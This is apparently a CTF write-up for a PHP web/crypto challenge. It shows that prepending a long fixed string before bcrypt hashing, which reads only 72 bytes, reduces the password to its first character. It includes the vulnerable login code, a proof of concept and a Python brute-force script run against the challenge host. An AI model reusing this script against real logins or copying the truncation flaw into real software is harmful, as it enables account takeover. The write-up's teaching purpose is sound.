## Challenge

**Title**
WEB/CRYPTO // 🔐 Entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy

**Description**
It's finally here. Something everyone's been waiting for. A service that solves the biggest problem of humanity. People passwords. They are tooooooooooo short. This service applies so much fresh organic gluten free salt to the password that even the biggest noob who has the word 'dog' as their password can feel safe. So much entropy that I can't even imagine it!
🔗 https://entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-2f567adc1e4d.1753ctf.com
💾 https://get.1753ctf.com/entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/index.php?s=PqlsZy3E

## Solution

We've been provided with an applcation using this code for authentication.

```php
session_start();

$usernameAdmin = 'admin';
$passwordAdmin = getenv('ADMIN_PASSWORD');

$entropy = 'additional-entropy-for-super-secure-passwords-you-will-never-guess';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $hash = password_hash($usernameAdmin . $entropy . $passwordAdmin, PASSWORD_BCRYPT);
    
    if ($usernameAdmin === $username && 
        password_verify($username . $entropy . $password, $hash)) {
        $_SESSION['logged_in'] = true;
    }
}
```

After successfull login for admin user it will give us a flag.

```php
<?php
if (isset($_SESSION['logged_in'])) {
?>
    <div class="welcome">Hello, Admin, here's your secret message:<br />
    <?php echo strval(getenv('flag')); ?> <br/><br/>Don't share it with anyone!</div>
<?php
}
?>
```

We can see that the bcrypt function was used here, which only processes the first 72 bytes of the input. I prepared a PoC to verify my findings.

```php
<?php

	$usernameAdmin = 'admin';
	$passwordAdmin = 'password';

	$entropy = 'additional-entropy-for-super-secure-passwords-you-will-never-guess';

	$username = 'admin';
	$password = 'pddddd';

	$hash = password_hash($usernameAdmin . $entropy . $passwordAdmin, PASSWORD_BCRYPT);

	if ($usernameAdmin === $username &&
	    password_verify($username . $entropy . $password, $hash)) {
	    $_SESSION['logged_in'] = true;
	    echo "Success";
	}
?>
```

The execution of this code completed successfully. In summary, instead of brute-forcing the full password, it was sufficient to recover just its first character, and I used this short Python script to do so.

```python
import itertools
import string
import requests

url = "https://entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-2f567adc1e4d.1753ctf.com/"

charset = ''.join(chr(i) for i in range(32, 127))

success_indicator = "secret message"

for combo in charset:
    password = ''.join(combo)
    
    data = {
        "username": "admin",
        "password": password
    }

    try:
        response = requests.post(url, data=data)
        
        if success_indicator in response.text:
            print(f"[✅] Password found: {password}")
            break
        else:
            print(f"[❌] Trying: {password}")

    except Exception as e:
        print(f"[⚠️] Error with {password}: {e}")
```

After all, I logged in using the recovered character (~) and successfully obtained the flag.